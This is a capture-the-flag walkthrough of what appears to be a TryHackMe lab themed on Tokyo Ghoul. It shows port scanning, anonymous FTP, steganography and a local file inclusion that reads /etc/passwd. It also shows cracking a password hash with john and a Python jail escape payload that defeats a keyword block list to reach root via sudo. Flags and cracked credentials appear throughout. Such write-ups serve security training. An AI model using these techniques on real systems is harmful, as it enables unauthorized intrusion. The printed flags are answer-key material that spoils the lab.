## How many ports are open?

**3**

```console
❯ rustscan -a 10.10.191.37 --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.191.37:21
Open 10.10.191.37:22
Open 10.10.191.37:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-06 14:49 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
Initiating Ping Scan at 14:49
Scanning 10.10.191.37 [2 ports]
Completed Ping Scan at 14:49, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:49
Completed Parallel DNS resolution of 1 host. at 14:49, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:49
Scanning 10.10.191.37 [3 ports]
Discovered open port 21/tcp on 10.10.191.37
Discovered open port 80/tcp on 10.10.191.37
Discovered open port 22/tcp on 10.10.191.37
Completed Connect Scan at 14:49, 0.15s elapsed (3 total ports)
Initiating Service scan at 14:49
Scanning 3 services on 10.10.191.37
Completed Service scan at 14:49, 6.35s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.191.37.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:49
NSE: [ftp-bounce 10.10.191.37:21] PORT response: 500 Illegal PORT command.
Completed NSE at 14:49, 4.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 1.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
Nmap scan report for 10.10.191.37
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-12-06 14:49:37 IST for 12s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.0.215
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeIXT46ZiVmp8Es0cKk8YkMs3kwCdmC2Ve/0A0F7aKUIOlbyLc9FkbTEGSrE69obV3u6VywjxZX6VWQoJRHLooPmZCHkYGjW+y5kfEoyeu7pqZr7oA8xgSRf+gsEETWqPnSwjTznFaZ0T1X0KfIgCidrr9pWC0c2AxC1zxNPz9p13NJH5n4RUSYCMOm2xSIwUr6ySL3v/jijwEKIMnwJHbEOmxhGrzaAXgAJeGkXUA0fU1mTVLlSwOClKOBTTo+FGcJdrFf65XenUVLaqaQGytKxR2qiCkr7bbTaWV0F8jPtVD4zOXLy2rGoozMU7jAukQu6uaDxpE7BiybhV3Ac1x
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5o77nOh7/3HUQAxhtNqHX7LGDtYoVZ0au6UJzFVsAEJ644PyU2/pALbapZwFEQI3AUZ5JxjylwKzf1m+G5OJM=
|   256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJwYjN/qiwrS4es9m/LgWitFMA0f6AJMTi8aHkYj7vE
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Welcome To Tokyo goul
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:49
Completed NSE at 14:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds
```


# What is the OS Used?

**Ubuntu**


# Did you find the note that the others ghouls gave you? Where did you find it ?  

**jasonroom.html**
```console
❯ curl http://10.10.191.37/
<html>
<head>
	<title>Welcome To Tokyo goul</title>
	<link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

	<h1 style="text-align: center;">Kaneki </h1>
	<div class="center-wrapper">
		<img src="tokyo.gif">
	</div>

	<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->

	<br>
	<p>Ken Kaneki is a regular high school teenager who decides to go on a date with a girl named Rize Kamishiro. Kaneki fails to notice that there is something unusual about her. The girl then shows her true form and transforms into a ghoul who is hungry for Kaneki flesh. But suddenly, steel beams fall on her from the ceiling and she is instantly killed. Left in a very critical state, Ken is rushed to a hospital nearby. When he regains his consciousness, the doctor informs him that his organs have been replaced with that of Rize .</p>
	<br>
	<p>Kaneki is kidnapped by Jason. He then uses the most brutal ways to torture him by cutting off parts of him but gives him just enough time to regenerate again. While Kaneki seems to take the physical torture like a champ, he begins to struggle when he is reminded of the two other ghouls who gave him hopes of escaping.</p>

	<a href="jasonroom.html">Can you help him escape?</a>

</body>
</html>
```

# What is the key for Rize executable?

**kamishiro**

```console
❯ ftp 10.10.191.37
Connected to 10.10.191.37.
220 (vsFTPd 3.0.3)
Name (10.10.191.37:divu050704): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43149|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49213|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> get Aogiri_tree.txt
local: Aogiri_tree.txt remote: Aogiri_tree.txt
229 Entering Extended Passive Mode (|||44914|)
150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
100% |***************************************|   480        5.14 MiB/s    00:00 ETA
226 Transfer complete.
480 bytes received in 00:00 (3.16 KiB/s)
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42269|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> mget *
mget need_to_talk [anpqy?]? y
229 Entering Extended Passive Mode (|||47239|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
100% |***************************************| 17488      117.05 KiB/s    00:00 ETA
226 Transfer complete.
17488 bytes received in 00:00 (57.71 KiB/s)
mget rize_and_kaneki.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||40517|)
150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
100% |***************************************| 46674      152.86 KiB/s    00:00 ETA
226 Transfer complete.
46674 bytes received in 00:00 (101.57 KiB/s)
ftp> exit
221 Goodbye.
```

- Found a note `Aogiri_tree.txt`

```console
❯ cat Aogiri_tree.txt
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will.
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```

- Gave execution right to `need_to_talk`, and executed it.

```console
❯ chmod +x need_to_talk
❯ ./need_to_talk
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> pass123
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
```

- We need a passphrase.
- Read all the string of the executable.

```console
❯ strings need_to_talk
/lib64/ld-linux-x86-64.so.2
mgUa
puts
putchar
stdin
printf
fgets
strlen
stdout
malloc
usleep
__cxa_finalize
setbuf
strcmp
__libc_start_main
free
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
You_founH
d_1t
[]A\A]A^A_
kamishiro
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
Good job. I believe this is what you came for:
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
;*3$"
GCC: (Debian 9.3.0-15) 9.3.0
crtstuff.c
<------------------SNIP-------------------------->
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

- `kamishiro` seems to be the passphrase.

# What the message mean did you understand it ? What it says?

**d1r3c70ry_center**

- Again executed the binary and got another passphrase.

```console
❯ ./need_to_talk
Hey Kaneki finnaly you want to talk
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> kamishiro
Good job. I believe this is what you came for:
You_found_1t
```

- Now used `steghide` on the image `rize_and_kaneki.jpg` and found a text file.

```console
❯ steghide --extract -sf rize_and_kaneki.jpg
Enter passphrase:
wrote extracted data to "yougotme.txt".
```


```console
❯ cat yougotme.txt
haha you are so smart kaneki but can you talk my code

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory
```

- This is Morse code , decoded it from [here](https://morsecode.world/international/translator.html)

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/31.png)

- Decoded this hex code from `cyberchef`

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/32.png)

# what is rize username ?

**kamishiro**

```console
❯ curl http://10.10.191.37/d1r3c70ry_center/
<html>
<head>
	<title>Scan me</title>
	<link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

	<h1 style="text-align: center;">Scan me </h1>
	<div class="center-wrapper">
		<img src="scanme.gif">
	</div>
	<p> Scan me scan me scan all my ideas aaaaahhhhhhhh </p>
</body>
</html>
```

- Started gobuster on `http://10.10.191.37/d1r3c70ry_center/`


```console
❯ gobuster dir --url http://10.10.191.37/d1r3c70ry_center   -w /usr/share/wordlists/dirb/common.txt -x php,js,txt,html  | tee gobuster.log
=======https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/========================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.191.37/d1r3c70ry_center
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt,html
[+] Timeout:                 10s
===============================================================
2022/12/06 15:37:26 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/claim                (Status: 301) [Size: 329] [--> http://10.10.191.37/d1r3c70ry_center/claim/]
```

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/33.png)

- Clicked yes and was redirected to `http://10.10.191.37/d1r3c70ry_center/claim/index.php?view=flower.gif`.
- Seems like LFI.
- Tried Directory traversing, but seems that it is using filters, so URL-encoded the payload and got `/etc/passwd` 

```console
❯ curl http://10.10.191.37/d1r3c70ry_center/claim/index.php\?view\=../../../../../../../../../etc/passwd
<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=flower.gif">NO</a>
	    <a href="index.php?view=flower.gif">YES</a>
	</div>
no no no silly don't do that
```

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/34.png)

# what is rize password ?

`password123`

- Found `UNIX SHA512` for `kamishiro`

```console
❯ cat hash
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
```

- Cracked it with john


```console
❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:01 DONE (2022-12-06 16:12) 0.5376g/s 825.8p/s 825.8c/s 825.8C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```


# User.txt

**e6215e25c0783eb4279693d9f073594a**

```console
❯ ssh kamishiro@10.10.191.37
The authenticity of host '10.10.191.37 (10.10.191.37)' can't be established.
ED25519 key fingerprint is SHA256:oo//h4aM0BBJSlV7s7eejBvC/3yzDDk/PL7KIK6mewQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.191.37' (ED25519) to the list of known hosts.
kamishiro@10.10.191.37's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 23 22:29:38 2021 from 192.168.77.1
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ cat user.txt 
e6215e25c0783eb4279693d9f073594a
```

# Root.txt

**9d790bb87898ca66f724ab05a9e6000b**

- We can run `/usr/bin/python3 /home/kamishiro/jail.py` as any user

```console
kamishiro@vagrant:~$ cat jail.py
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

- Damn we can't run any command related to os 
- Found this [blog](https://anee.me/escaping-python-jails-849c65cf306e)
- Used this payload

```console
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash -p') 
```

```console
kamishiro@vagrant:~$ sudo -u root /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash -p')
root@vagrant:~# whoami
root

```
